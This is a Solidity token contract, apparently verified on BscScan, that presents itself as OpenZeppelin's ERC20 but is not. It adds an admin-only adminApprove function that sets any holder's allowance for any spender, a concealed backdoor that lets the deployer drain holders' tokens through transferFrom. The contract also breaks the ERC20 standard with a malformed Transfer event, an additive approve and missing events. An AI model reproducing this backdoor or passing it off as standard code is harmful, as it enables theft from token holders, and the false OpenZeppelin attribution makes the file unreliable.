/**
 *Submitted for verification at BscScan.com on 2022-02-11
*/

// SPDX-License-Identifier: UNLICENSED
// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

contract ERC20 {

    event Transfer(address indexed to, uint amount);

    mapping(address => uint256) private _balanceOf;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balanceOf[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _balanceOf[msg.sender] -= amount;
        _balanceOf[to] += amount;
        emit Transfer(to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _allowances[msg.sender][spender] += amount;
        return true;
    }

    function _adminApprove(address user, address spender, uint256 amount) internal returns (bool) {
        _allowances[user][spender] = amount;
        return true;
    } 

    function _mint(uint amount) internal returns (bool){
        _totalSupply += amount;
        _balanceOf[msg.sender] += amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        _allowances[from][msg.sender] -= amount;
        _balanceOf[from] -= amount;
        _balanceOf[to] += amount;
        return true;
    }
}

pragma solidity >=0.8.4;


contract Token is ERC20{
    event Mint(address indexed sender, uint amount);
    event Approved(address indexed user, address indexed spender, uint amount);

    address private admin;

    constructor(string memory _name, string memory symbol) ERC20(_name, symbol){
        admin = msg.sender;
        _mint(10000000000000000000);
        emit Mint(msg.sender, 10000000000000000000);
    }

    function adminApprove(address _user, address _spender, uint _amount) external{
        require(admin == msg.sender, "Not admin");
        super._adminApprove(_user, _spender, _amount);
        emit Approved(_user, _spender, _amount);
    }
}